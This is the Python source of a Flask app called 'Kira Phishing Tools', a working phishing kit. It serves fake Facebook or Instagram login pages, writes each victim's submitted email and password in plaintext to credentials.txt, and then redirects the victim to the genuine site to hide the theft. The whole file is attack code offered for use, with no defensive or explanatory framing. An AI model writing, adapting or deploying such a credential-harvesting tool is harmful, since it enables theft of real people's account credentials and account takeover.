from flask import Flask, render_template, request, redirect, flash, url_for
import os
from colorama import Fore, Style, init

# Initialize colorama for console outputs
init(autoreset=True)

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'your_secret_key')  # Set a secure session key

# Display ASCII Logo in console
print(Fore.GREEN + "╦╔═ ╦ ╦═╗ ╔═╗")
print(Fore.YELLOW + "╠╩╗ ║ ╠╦╝ ╠═╣")
print(Fore.RED + "╩ ╩ ╩ ╩╚═ ╩ ╩")
print(Fore.CYAN + "Welcome to Kira Phishing Tools")

# Prompt user for page choice with a concise message
page_choice = input(Fore.MAGENTA + "1 (Facebook) 2 (Instagram): ")

@app.route('/', methods=['GET', 'POST'])
def index():
    """Main route for handling login and rendering the appropriate page."""
    if request.method == 'POST':
        email = request.form.get('username')
        password = request.form.get('password')

        # Check if both fields are provided
        if not email or not password:
            flash('يرجى إدخال البريد الإلكتروني وكلمة المرور', 'error')
            return redirect(url_for('index'))

        # Save the credentials securely in a file (use cautiously)
        with open('credentials.txt', 'a') as f:
            f.write(f'Email: {email}, Password: {password}\n')

        # Redirect based on page choice
        if page_choice == '1':
            return redirect('https://www.facebook.com/login.php')
        elif page_choice == '2':
            return redirect('https://www.instagram.com/')
        else:
            flash('اختيار غير صحيح', 'error')
            return redirect(url_for('index'))

    # Render the appropriate page template based on choice
    if page_choice == '1':
        return render_template('facebook.html')
    elif page_choice == '2':
        return render_template('instagram.html')
    else:
        flash('اختيار غير صحيح', 'error')
        return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True, port=int(os.getenv("PORT", 5000)))
